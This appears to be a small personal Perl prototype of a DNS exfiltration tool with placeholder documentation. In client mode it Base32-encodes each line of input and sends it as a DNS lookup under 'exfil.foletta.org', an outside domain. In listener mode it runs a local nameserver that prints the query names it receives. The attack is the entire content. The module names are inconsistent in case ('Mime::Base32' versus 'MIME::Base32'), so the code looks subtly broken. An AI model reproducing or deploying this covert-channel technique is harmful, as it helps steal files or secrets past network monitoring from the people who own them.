#!/usr/bin/env perl

use strict;
use warnings;
use 5.010;
use Getopt::Long;
use Pod::Usage;
use Carp;

use Net::DNS::Nameserver;
use Net::DNS;
use Mime::Base32;

=head1 NAME

blah.pl - A script that does something

=head1 SYNOPSIS

./blah.pl [options] [file ...]

 Options:
  -o|--option

=head1 OPTIONS

=over 4

=item B<-o|--option>

An option.

=back

=head1 DESCRIPTION

B<blah.pl> will do something

=cut

my %args;

GetOptions(
    "listener", \$args{listener},
    "help" => sub { pod2usage(1) }
) or pod2usage(2);



if ($args{listener}) {
    listener();
} else {
    client();
}

sub listener {
    say "Listening...";
    my $ns = Net::DNS::Nameserver->new(
        LocalAddr => ['127.0.0.1'],
        ReplyHandler => \&dns_worker
    )->main_loop;
}


sub client {
    while (<>) {
        chomp;
        my $a_rec = MIME::Base32::encode($_);
        rr("$a_rec.exfil.foletta.org");
    }
}







sub dns_worker {
    my ( $qname, $qclass, $qtype, $peerhost, $query, $conn ) = @_;

    say "$qname";
}
